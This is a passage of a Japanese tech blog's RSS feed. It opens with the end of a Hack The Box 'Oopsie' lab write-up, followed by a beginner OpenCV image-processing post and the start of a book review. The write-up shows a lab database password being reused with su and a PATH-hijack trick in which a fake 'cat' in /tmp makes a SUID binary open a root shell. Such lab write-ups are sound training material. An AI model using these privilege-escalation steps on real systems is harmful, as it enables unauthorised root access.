loading="lazy"><p>lsコマンドで色々探してると、<code>/var/www/html/cdn-cgi/login</code>配下にdb.phpファイルが存在します。<br>db.phpファイルをcatしてみます。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> db.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;robert&#x27;</span>,<span class="string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="string">&#x27;garage&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>mysqlへの接続情報が記載されています。よって、設問の解答は<code>db.php</code>になります。</p><h3 id="TASK7"><a href="#TASK7" class="headerlink" title="TASK7"></a>TASK7</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What executible is run with the option &quot;-group bugtracker&quot; to identify all files owned by the bugtracker group?</span><br></pre></td></tr></table></figure><p>bugtrackerグループが所有するすべてのファイルを特定するために、オプション “-group bugtracker” を付けて実行される実行ファイルは何か？ と問われています。</p><p>whoamiコマンドを実行すると <code>www-data</code>と表示されます。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>robertに切り替えたいと考えたのですが、ここで詰まってしまい、walkthroughを確認してしまいました。</p><ul><li>Hack The Box は Starting Pointの問題は、walkthroughという回答が用意されています。</li></ul><img src="/images/20230425a/image_10.png" alt="" width="725" height="105" loading="lazy"><p>walkthroughを確認すると、どうやらPythonの実行環境があるらしいので、上図のように実行します。</p><p>※なぜptyをimportしているかはこちらの記事が参考になりました。<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup></p><p>robertにユーザを変更します。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ su robert</span><br></pre></td></tr></table></figure><p>パスワードはmysqlの接続情報に記載されていた<code>M3g4C0rpUs3r!</code>を入力するとユーザを切り替えすることができました。<br>bugtrackerに属するファイルを探します。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -group bugtracker 2&gt;/dev/null</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">/usr/bin/bugtracker</span></span><br></pre></td></tr></table></figure><p>何やら怪しげなファイルがありました。設問の回答としては、<code>find</code>です。</p><h3 id="TASK8"><a href="#TASK8" class="headerlink" title="TASK8"></a>TASK8</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Regardless of which user starts running the bugtracker executable, what&#x27;s user privileges will use to run?</span><br></pre></td></tr></table></figure><p>どのユーザーがbugtracker実行ファイルを実行し始めたかに関わらず、実行するために使用するユーザー権限は何ですか？と問われています。こちらの回答は<code>root</code>になります。</p><h3 id="TASK9"><a href="#TASK9" class="headerlink" title="TASK9"></a>TASK9</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What SUID stands for?</span><br></pre></td></tr></table></figure><p>SUIDは何を表すかを問われています。SUIDについて知らなかったため調べてみました。<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></p><p>SUIDとは、Set owner User IDの略で、セットしたUserIDでファイルが実行されるそうです。</p><p>よって回答としては、<code>Set owner User ID</code>になります。</p><h3 id="TASK10"><a href="#TASK10" class="headerlink" title="TASK10"></a>TASK10</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the name of the executable being called in an insecure manner?</span><br></pre></td></tr></table></figure><p>安全でない方法で呼び出されている実行ファイルの名前は何ですか？と問われています。</p><p>TASK7でbugtracker　グループに属しているファイルを実行してみます。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: hoge</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span>: /root/reports/hoge: No such file or directory</span><br></pre></td></tr></table></figure><p>実行するとidを聞かれ、hogeと入力すると出力結果には、<code>cat: /root/reports/hoge: No such file or directory</code> と表示されていることがわかります。</p><p>つまり、このファイルは <code>/root/reports/</code> 入力値のファイルを <code>cat</code> していることがわかります。</p><p>設問の解答としては、<code>cat</code>になります。</p><h3 id="user-txtの取得"><a href="#user-txtの取得" class="headerlink" title="user.txtの取得"></a>user.txtの取得</h3><p><code>user.txt</code> は既に <code>/home/robert/</code> 配下に存在しているのでその中身を取得すればよいです。</p><h3 id="root-txtの取得"><a href="#root-txtの取得" class="headerlink" title="root.txtの取得"></a>root.txtの取得</h3><p><code>/usr/bin/bugtrancker</code> は <code>root</code> ユーザとして実行される。<br><code>cat</code> を自分の作成したファイルを呼び出したい。<br>そこで、 <code>/tmp</code> 配下に <code>cat</code> ファイルを作成し、</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">touch</span> <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">cat</span></span><br></pre></td></tr></table></figure><p>また、 <code>cat</code> ファイルの中身に <code>/bin/bash</code> を書き込みます。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/tmp:<span class="variable">$PATH</span>&quot;</span></span><br></pre></td></tr></table></figure><p>これにより、<code>/usr/bin/bugtracker</code>を実行し、 <code>whoami</code> を実行すると <code>root</code> ユーザでシェルが立ち上がっているのが確認できます。</p><img src="/images/20230425a/image_11.png" alt="" width="338" height="197" loading="lazy"><p>あとは <code>/root</code> 配下のフラグを提出すれば完了です。</p><h2 id="まとめ"><a href="#まとめ" class="headerlink" title="まとめ"></a>まとめ</h2><p>今回は権限昇格がポイントでした。</p><p>権限昇格の部分で非常に詰まりました。</p><p>TIER2以降では権限昇格は必要な知識なので、しっかり使えるようになることが大切だと感じました。</p><p>明日の記事は、渡邉さんの<a href="/articles/20230426a/">Pulumiで始めるIaC入門</a>です。</p><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style:none; padding-left: 0;"><li id="fn:1"><span style="vertical-align: top; padding-right: 10px;">1.</span><span style="vertical-align: top;"><a href="https://qiita.com/kasei-san/items/3edb52359ff288d2f435">https://qiita.com/kasei-san/items/3edb52359ff288d2f435</a></span><a href="#fnref:1" rev="footnote"> ↩</a></li><li id="fn:2"><span style="vertical-align: top; padding-right: 10px;">2.</span><span style="vertical-align: top;"><a href="https://eng-entrance.com/linux-permission-suid">https://eng-entrance.com/linux-permission-suid</a></span><a href="#fnref:2" rev="footnote"> ↩</a></li></ol></div></div>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Security/">Security</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E7%AB%B6%E6%8A%80%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0/">競技プログラミング</category>
      
      <category domain="https://future-architect.github.io/tags/HackTheBox/">HackTheBox</category>
      
      
      <comments>https://future-architect.github.io/articles/20230425a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>初めての画像処理〜OpenCVって何ができるの？〜</title>
      <link>https://future-architect.github.io/articles/20230424a/</link>
      <guid>https://future-architect.github.io/articles/20230424a/</guid>
      <pubDate>Sun, 23 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;この記事は&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>この記事は<a href="/articles/20230417a/">春の入門ブログ連載2023</a>6日目です。</p><p>新卒未経験でIT業界に飛び込んではや一年。だんだんと普段使うJavaに関しては余裕が出てきたところで他の言語にも手を出そうと思い、以前から気になっていた画像処理にチャレンジしました。</p><p>普段はコーディングしてもテストがうまくいく or いかないのどちらかでしか成果物を見ることができなかったので、視覚的に動いてる！を感じてみたく、新宿の紀伊國屋で分かりやすそうな書籍を買い、いろいろ試したので同じように画像処理にちょっと興味があるような人に読んでいてもらたらうれしいです。（入門編ということでセットアップなどに具体的に触れるよりも、いじっていみた面白さを伝える方に寄せています）</p><p>参考書籍：<a href="https://www.amazon.co.jp/dp/4877834605">実践　OpenCV 4 for Python 画像映像情報処理と機械学習</a></p><h2 id="実際にPythonで画像処理を体験した感想"><a href="#実際にPythonで画像処理を体験した感想" class="headerlink" title="実際にPythonで画像処理を体験した感想"></a>実際にPythonで画像処理を体験した感想</h2><p>「めっちゃ簡単なのにめっちゃ楽しいじゃん!」<br>…素直にこの感想が最初に出てきます。笑</p><p>今までJavaしか触ったことがなく、数値や文字列をやりくりする処理は慣れ親しんでいたのですが、だからこそ、画像や映像を処理するのはあまり想像できていなくて、複雑なメソッドやロジックで処理が必要なのかなと漠然と考えていたら、真逆でした！</p><p>構文がシンプルで、ライブラリとして多数の関数が用意されているため、それらを使用することですぐにやりたいことができてしまうので学習がとてもスムーズに進みました。</p><p>驚いたのが、自動運転のCMなどで車を認識すると四角い枠で追う映像を見たことがあると思うのですが、あの処理を50行ほどのコードで実現できてしまうことです。（書籍の最後の方に解説と一緒に載っています）</p><p>すごく遠いもののように感じていた実際に使われている技術を自分でできたのですごい興奮しました！！</p><h2 id="画像処理の基本的な考え方"><a href="#画像処理の基本的な考え方" class="headerlink" title="画像処理の基本的な考え方"></a>画像処理の基本的な考え方</h2><p>画像処理を学ぶ上で一番最初に身につけるべき考え方が、画像処理と言っても画像や映像を数字に変換して処理しているということです。</p><p>画像は小さいコマ（ピクセル）の集まりからなるもので、それらは色や明るさを数値化した情報を持っています。例えば、明るさの情報は最小値0が黒を表し、最大値255が白を表すといった具合です。色の場合は赤、緑、青の三原色の強弱を0〜255で表してそのピクセルの色の情報としています。</p><p>そのため画像一枚をどうこう処理する、というわけではなく、その小さいコマ（ピクセル）ごとに色や明るさを数値化し、それらに対して計算処理などを施すことによって画像処理などを行なっているのです。<br>例で言うと、中心線を軸に左右のピクセルが持つ数値を入れ替えることで「画像の左右反転」が実現できます。映像は我有の連続なので同じような考え方で処理できます。</p><p>正直、簡単ですが、この考え方さえ理解できていればあとはライブラリを使いこなすだけなので7割学習が終わったといっても過言ではありません。（本当に）</p><h2 id="OpenCVの基本的なアルゴリズム"><a href="#OpenCVの基本的なアルゴリズム" class="headerlink" title="OpenCVの基本的なアルゴリズム"></a>OpenCVの基本的なアルゴリズム</h2><p>OpenCVで実現できる画像処理をいくつか紹介します。</p><h3 id="エッジ検出"><a href="#エッジ検出" class="headerlink" title="エッジ検出"></a>エッジ検出</h3><p>輪郭を抽出する処理です。</p><p>内部で行われている処理としては、各ピクセルで左側のピクセルとの明るさの数値の差を出すことで差が大きな部分＝輪郭という認識で差が大きいピクセルを明るさ255の白、それ以外を明るさ0の黒にすることで輪郭を抽出します。エッジ検出のアルゴリズムがいくつかある中で性能が高いものとしてcv2.Canny()が紹介されていました。</p><p>それぞれの引数の意味は、srcは読み込んだ画像、150が輪郭として認識するためのピクセルの明さの差、50が輪郭は繋がっているという前提で、どこまで差が小さくなっても輪郭として認識するかの設定です。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画像の読み込み処理</span></span><br><span class="line"><span class="comment"># --------------</span></span><br><span class="line"><span class="comment"># Cannyエッジ検出</span></span><br><span class="line">dst = cv2.Canny(src, <span class="number">50</span>, <span class="number">150</span>)</span><br><span class="line"><span class="comment"># ---------------</span></span><br><span class="line"><span class="comment"># 画像の表示処理</span></span><br></pre></td></tr></table></figure><img src="/images/20230424a/dumbbell.jpeg" alt="" width="400" height="267" loading="lazy"><img src="/images/20230424a/image_dst.jpeg" alt="" width="400" height="267" loading="lazy"><h3 id="テンプレートマッチング"><a href="#テンプレートマッチング" class="headerlink" title="テンプレートマッチング"></a>テンプレートマッチング</h3><p>画像の中からテンプレートと完全に一致する物体を検出する処理です。</p><p>テンプレートマッチングの基本的な考え方としては、テンプレート画像をを対象の画像上でスライドさせながら、各位置におけるピクセルの値の類似度を計算し、最も類似した場所を見つけるというものです。</p><p>計算方法は難しかったので割愛させてもらいます。（計算式がわからなくてもアルゴリズムを知っていれば超簡単に実践できます！）</p><p>以下の処理はcv2.matchTemplate()で類似度を算出、cv2.minMaxLoc()で類似度の最小値点、最大値点を取得し、その座標をもとにcv2.rectangle()でテンプレート画像の大きさの四角形を描画して一致する箇所を示しています。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画像の読み込み処理</span></span><br><span class="line"><span class="comment"># --------------</span></span><br><span class="line"><span class="comment"># テンプレートマッチングの実行</span></span><br><span class="line">result = cv2.matchTemplate(img, template, cv2.TM_CCOEFF_NORMED)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最大のマッチング位置を取得</span></span><br><span class="line">min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)</span><br><span class="line">top_left = max_loc</span><br><span class="line">h, w = template.shape[:<span class="number">2</span>]</span><br><span class="line">bottom_right = (top_left[<span class="number">0</span>] + w, top_left[<span class="number">1</span>] + h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元画像にマッチング位置を描画</span></span><br><span class="line">cv2.rectangle(img, top_left, bottom_right, <span class="number">255</span>, <span class="number">2</span>)</span><br><span class="line">cv2.putText(img, name, (top_left[<span class="number">0</span>]+<span class="number">10</span>, bottom_right[<span class="number">1</span>]-<span class="number">30</span>),</span><br><span class="line">            cv2.FONT_HERSHEY_SIMPLEX, <span class="number">1</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line"><span class="comment"># ---------------</span></span><br><span class="line"><span class="comment"># 画像の表示処理</span></span><br></pre></td></tr></table></figure><p>↓対象画像<br><img src="/images/20230424a/muscular_man.jpeg" alt="muscular_man.jpeg" width="1200" height="725" loading="lazy"></p><p>↓テンプレート画像<br><img src="/images/20230424a/muscular_man_abs.jpeg" alt="muscular_man_abs.jpeg" width="267" height="222" loading="lazy"></p><p>↓処理後<br><img src="/images/20230424a/man_abs.jpeg" alt="man_abs.jpeg" width="1200" height="725" loading="lazy"></p><h3 id="特徴点検出"><a href="#特徴点検出" class="headerlink" title="特徴点検出"></a>特徴点検出</h3><p>テンプレートマッチングではピクセルの値の類似度で一致しているかどうかを確認しているため、対象が回転したり、サイズが変わるだけで正しく検出ができなくなります。その弱点を補うのが特徴点検出です。これは形状に着目し判別します。具体的には検出したい物の角（特徴点）を検出し、対象画像の中から同じ特徴点（特徴点が持つ情報を特徴量という）が多く発見されれば、検出するというロジックです。<br>（添付は画像ですが、実際には左の窓に動画が再生されながら特徴点を検出し、右の窓に表示されている動画内の1フレームに存在する特徴点と一致した際にその点が繋がるようになっっています）</p><p>orb.detectAndCompute()で特徴点と特徴量を取得し、matcher.match()で特徴点同士のマッチングを行ったあと、精度の高い特徴点のペアの数がどれほどあるかによって検出を判断するようになっています。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 読み込み処理</span></span><br><span class="line"><span class="comment"># --------------</span></span><br><span class="line"><span class="comment"># 入力フレームとテンプレートフレームの特徴点と特徴量を抽出する</span></span><br><span class="line">kp1, des1 = orb.detectAndCompute(frame, <span class="literal">None</span>)</span><br><span class="line">kp2, des2 = orb.detectAndCompute(template_frame, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 入力フレームとテンプレートフレームの特徴量をマッチングする</span></span><br><span class="line">matches = matcher.match(des1, des2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 良いマッチング点を選択する</span></span><br><span class="line">good_matches = []</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> matches:</span><br><span class="line">    <span class="keyword">if</span> m.distance &lt; <span class="number">30</span>:</span><br><span class="line">        good_matches.append(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># マッチング結果を描画する</span></span><br><span class="line">result = cv2.drawMatches(frame, kp1, template_frame, kp2, good_matches, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># マッチング点の数が一定以上であれば、特定のフレームと同じと判断する</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(good_matches) &gt; <span class="number">50</span>:</span><br><span class="line">    cv2.putText(result, <span class="string">&#x27;Detect&#x27;</span>, (<span class="number">50</span>, <span class="number">50</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">1</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line"><span class="comment"># ---------------</span></span><br><span class="line"><span class="comment"># 表示処理</span></span><br></pre></td></tr></table></figure><img src="/images/20230424a/B805E443-C23C-4378-91A0-39E8D0078698.jpeg" alt="" width="1200" height="1046" loading="lazy"><img src="/images/20230424a/60A3F31F-C05E-4BBD-98F0-9D089DDB83A0.jpeg" alt="" width="1200" height="1051" loading="lazy"><img src="/images/20230424a/2084DA2A-A519-4EFD-8AB5-775F54F18486.jpeg" alt="" width="1200" height="1059" loading="lazy"><h3 id="物体認識"><a href="#物体認識" class="headerlink" title="物体認識"></a>物体認識</h3><p>この書籍の最終章にはディープラーニングについても解説がありました。</p><p>ディープラーニングというと、とんでもなく複雑なプログラミングを組まなければいけないと思っていたのですが、用意されているフレームワークを利用することで簡単に実現できます。</p><p>ディープラーニングによる物体認識は、画像の入力値に重みをかけたり、バイアス値を足した結果がある数値よりも高い場合に特定のクラス（犬、車など）と判断する流れになっています。そのため、既に画像を何回も読み込み、計算を行うことで重みやバイアス値を調節したもの（ニューラルネットワーク）があればすぐに物体認識を行うことができます。</p><p>イメージ：以下画像の左の矢印が画像の入力値で丸部分が重みやバイアス値の計算部分、最終的に右の矢印に出力された値でクラスの判別を行う<br><img src="/images/20230424a/2563742.jpg" alt="" width="1200" height="900" loading="lazy"></p><h2 id="ではOpenCVを使って何をするか"><a href="#ではOpenCVを使って何をするか" class="headerlink" title="ではOpenCVを使って何をするか"></a>ではOpenCVを使って何をするか</h2><h4 id="アームカールフォームチェック"><a href="#アームカールフォームチェック" class="headerlink" title="アームカールフォームチェック"></a>アームカールフォームチェック</h4><p>今回参考にした書籍でOpenCVの基本を抑えられたので、自分の普段している活動に落とし込めないかと思い、今までの処理紹介に使っている素材を見てもらえればわかるかもしれませんが、私は筋トレが好きなので、画像処理を使ってトレーニングの簡単なフォームチェックを実装してみました。</p><p>やっていることはアームカールをしっかりと最後まで追い込んでできているかチェックするプログラムです。<br>ロジックとしてはダンベルの赤を色範囲指定して輪郭を抽出、その輪郭に外接する矩形の底面が一定の高さを超えた場合にウィンドウに『OK』を表示するという流れです。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 動画の読み込み処理</span></span><br><span class="line"><span class="comment"># --------------</span></span><br><span class="line"><span class="comment"># 赤色領域を抽出</span></span><br><span class="line">mask = cv2.inRange(frame, red_lower, red_upper)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 輪郭を抽出</span></span><br><span class="line">contours, _ = cv2.findContours(mask, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(contours) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="comment"># 最大面積を持つ輪郭を抽出</span></span><br><span class="line">max_contour = <span class="built_in">max</span>(contours, key=cv2.contourArea)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 輪郭の外接矩形を取得</span></span><br><span class="line">x, y, w, h = cv2.boundingRect(max_contour)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ダンベルの最下部のy座標を取得</span></span><br><span class="line">bottom_y = y + h</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高さ180の位置に来たらOKを描画</span></span><br><span class="line"><span class="keyword">if</span> bottom_y &lt;= <span class="number">180</span>:</span><br><span class="line">    cv2.putText(frame, <span class="string">&#x27;OK&#x27;</span>, (<span class="number">10</span>, <span class="number">50</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">2</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">2</span>, cv2.LINE_AA)</span><br><span class="line"><span class="comment"># ---------------</span></span><br><span class="line"><span class="comment"># 動画の表示処理</span></span><br></pre></td></tr></table></figure><p>使用ライブラリ紹介：</p><ul><li>cv2.inRange()<ul><li>引数の色範囲に該当するピクセルをマスクで戻してくれる</li></ul></li><li>cv2.findContours()<ul><li>オブジェクトの輪郭を返してくれる。第2、第3の引数は輪郭の検出モード、検出方法を指定する</li></ul></li><li>max()<ul><li>最大の面積を持つ輪郭を返してくれる。第2引数は比較関数</li></ul></li></ul><img src="/images/20230424a/スクリーンショット_2023-04-22_18.31.34.png" alt="" width="1200" height="675" loading="lazy"><img src="/images/20230424a/スクリーンショット_2023-04-22_19.01.33.png" alt="" width="1200" height="674" loading="lazy"><img src="/images/20230424a/スクリーンショット_2023-04-22_19.01.14.png" alt=" width="1200" height="673" loading="lazy"><h4 id="体の仕上がりチェック（ボツ）"><a href="#体の仕上がりチェック（ボツ）" class="headerlink" title="体の仕上がりチェック（ボツ）"></a>体の仕上がりチェック（ボツ）</h4><p>特徴点検出を使えば、体の仕上がりを憧れのプロのフィジーク選手と比較できるんじゃないかと思い、チャレンジしてみたのですが、以下のような要因で断念しました。。。</p><ol><li>関係ない背景・髪型などで特徴点が出てしまう<ul><li>比較したい筋肉とは関係ない背景・髪型などで特徴点を検出してしまい、一致率が下がることで正確な比較ができなくなってしまいました。</li></ul></li><li>比較の基準設定が難しい<ul><li>特徴点検出を行う場合は全く同じもの（例：前述のダンベル）であっても一致率は100%にならないため、それを考慮して一致と判断する基準を下げています。筋肉のように人それぞれでそもそも、そもそもつき方が違うようなものを比較する際にはどの程度の一致を基準にするかの設定が難しくなります</li></ul></li></ol><p>今回は試していませんが、先にHSV色空間などでマスキングして人体のみの検出を行い、さらには比較時にも、特徴点検出ではなく、体の仕上がりの良さについてS~Dまでラベル付したフィジーカーの画像を学習させて、一致率でなく、ランク付という方法ならうまくいくのかななどと考えておりました。機会があったら挑戦してみたいです。</p><h2 id="まとめ"><a href="#まとめ" class="headerlink" title="まとめ"></a>まとめ</h2><p>OpenCVで初めて画像処理に触ってみたということで画像処理の概念と基本的な処理がどのように機能するか、またそれらを使って著者がいじってみた体験を書かせていただきました。</p><p>先に述べたように、pythonもOpenCVも触ってみたのは初めてですが、Javaの経験が軽くあるだけの私でも１日で理解して、自分なりにいろいろ試すことができたのでとても初心者に優しい言語だったと感じました。</p><p>この記事を読んで興味を持って、OpenCVを触ってもらえたら嬉しいです！！</p><p>次は藤戸さんの<a href="/articles/20230425a/">Hack The Box Oopsie を解いてみた</a>です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/Python/">Python</category>
      
      <category domain="https://future-architect.github.io/tags/%E7%94%BB%E5%83%8F%E5%87%A6%E7%90%86/">画像処理</category>
      
      <category domain="https://future-architect.github.io/tags/OpenCV/">OpenCV</category>
      
      <category domain="https://future-architect.github.io/tags/%E7%AD%8B%E3%83%88%E3%83%AC/">筋トレ</category>
      
      <category domain="https://future-architect.github.io/tags/%E5%88%9D%E5%BF%83%E8%80%85/">初心者</category>
      
      
      <comments>https://future-architect.github.io/articles/20230424a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>『「技術書」の読書術』読書感想文</title>
      <link>https://future-architect.github.io/articles/20230421a/</link>
      <guid>https://future-architect.github.io/articles/20230421a/</guid>
      <pubDate>Thu, 20 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot; title=&quot;はじめに&quot;&gt;&lt;/a&gt;はじめに&lt;/h2&gt;&lt;p&gt;HealthCare Innovation Group(HIG)&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>HealthCare Innovation Group(HIG)<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>の永井優斗です。</p><p>この記事は<a href="/articles/20230417a/">「春の入門連載2023」</a>5日目です。昨日は市川浩暉さんの<a href="/articles/20230420a/">「Cloud Data Fusionで始めるETL入門」</a>でした。<br>※<a href="/articles/20220422a/">昨年も5日目に書いていた</a>ようです。</p><p>技術の世界は日進月歩で進んでいることから、他の業界以上に、日頃から知識を入れ続けることが求められるのがIT業界です。そんなIT業界にITコンサルタント&#x2F;エンジニアとして身を置く決意を持った新人さんにも楽しく学習してほしいなと思います。</p><p>学習のツールとしてインターネット上に公開されているQiitaなどの技術記事、このFuture Tech Blogのような技術ブログを読むことも有用ではありますが、技術書を１冊読むとその本で取り上げられているテーマを体系的に学ぶことができます。先輩社員から本は読もうね、とアドバイスされた方も多いのではないでしょうか。</p><p>今回は『「技術書」の読書術』という本を取り上げていきます。</p><img src="/images/20230421a/L.png" alt="" width="240" height="352" loading="lazy"><p><a href="https://www.shoeisha.co.jp/book/detail/9784798171548">https://www.shoeisha.co.jp/book/detail/9784798171548</a></p><h2 id="目次"><a href="#目次" class="headerlink" title="目次"></a>目次</h2><p>本書の目次は下記のとおりです。</p><h3 id="第１部-選び方"><a href="#第１部-選び方" class="headerlink" title="第１部　選び方"></a>第１部　選び方</h3><h4 id="1-1-あらゆる手段で本を見つける！書店の歩き方からITツールの活用法まで"><a href="#1-1-あらゆる手段で本を見つける！書店の歩き方からITツールの活用法まで" class="headerlink" title="1-1　あらゆる手段で本を見つける！書店の歩き方からITツールの活用法まで"></a>1-1　あらゆる手段で本を見つける！書店の歩き方からITツールの活用法まで</h4><ul><li>何を読んだらいいのかわからない？ ～書店での選び方のヒント～</li><li>本の種類別に考える選び方 ～技術書の種類を知る～</li><li>新刊の発売に気づく工夫 ～エンジニアなら自動化しよう～</li><li>“名著”の罠 ～「よい」本を選ぶのは難しい～</li><li>図書館の活用 ～貴重な本に出会う～</li><li>本を読む目的と選び方の関係 ～目指すゴールによって選ぶ本は変わる～</li></ul><h4 id="1-2-世界が広がる！貪欲に本を求めれば、出会うはずがない本にも出会える"><a href="#1-2-世界が広がる！貪欲に本を求めれば、出会うはずがない本にも出会える" class="headerlink" title="1-2　世界が広がる！貪欲に本を求めれば、出会うはずがない本にも出会える"></a>1-2　